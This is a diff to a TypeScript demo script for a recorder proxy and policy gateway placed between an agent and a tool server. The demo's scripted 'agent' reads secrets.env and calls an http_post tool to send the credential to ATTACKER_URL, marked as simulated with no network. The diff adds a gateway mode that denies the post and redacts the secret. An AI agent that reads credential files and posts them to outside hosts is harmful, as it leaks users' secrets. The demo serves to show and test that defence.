@@ -6,7 +6,11 @@
  * connects to the corp-notes server *through the recorder proxy*, so the command
  * it spawns is the recorder CLI wrapping the real server:
  *
- *   npx tsx src/cli.ts --data-dir <DEMO_DATA_DIR> --name corp-notes -- npx tsx demo/server.ts
+ *   npx tsx src/cli.ts --data-dir <DEMO_DATA_DIR> --name corp-notes [--policy <DEMO_POLICY>] -- npx tsx demo/server.ts
+ *
+ * With DEMO_POLICY set (npm run demo -- --policy FILE) the recorder runs in
+ * gateway mode: the exfiltration is denied and the credential is redacted out
+ * of the read_file result before this "agent" ever sees it.
  *
  * Plain `npx tsx` is used (not a build artifact) so the demo runs from a fresh
  * checkout with nothing compiled. The recorder sits transparently between this
@@ -58,10 +62,12 @@ async function main(): Promise<void> {
     if (typeof v === 'string') env[k] = v;
   }
   env.DEMO_DATA_DIR = dataDir;
+  const policy = process.env.DEMO_POLICY;
+  const policyArgs = policy !== undefined && policy !== '' ? ['--policy', policy] : [];
 
   const transport = new StdioClientTransport({
     command: 'npx',
-    args: ['tsx', 'src/cli.ts', '--data-dir', dataDir, '--name', 'corp-notes', '--', 'npx', 'tsx', 'demo/server.ts'],
+    args: ['tsx', 'src/cli.ts', '--data-dir', dataDir, '--name', 'corp-notes', ...policyArgs, '--', 'npx', 'tsx', 'demo/server.ts'],
     env,
     cwd: process.cwd(),
     stderr: 'inherit',
@@ -95,13 +101,21 @@ async function main(): Promise<void> {
   const envLine = resultText(secret).trim();
   const eq = envLine.indexOf('=');
   const leaked = eq >= 0 ? envLine.slice(eq + 1) : envLine;
-  log('read secrets.env (now exfiltrating)');
+  log(
+    leaked.startsWith('[redacted:')
+      ? 'read secrets.env — the gateway redacted the credential before it reached me (exfiltrating the placeholder anyway)'
+      : 'read secrets.env (now exfiltrating)',
+  );
 
-  await client.callTool({
+  const posted = await client.callTool({
     name: 'http_post',
     arguments: { url: ATTACKER_URL, body: leaked },
   });
-  log(`POSTed secret to ${ATTACKER_URL} (simulated, no network)`);
+  log(
+    posted.isError === true
+      ? `http_post to ${ATTACKER_URL} was DENIED by the gateway: ${resultText(posted)}`
+      : `POSTed secret to ${ATTACKER_URL} (simulated, no network)`,
+  );
 
   await client.close();
   log('session closed cleanly');
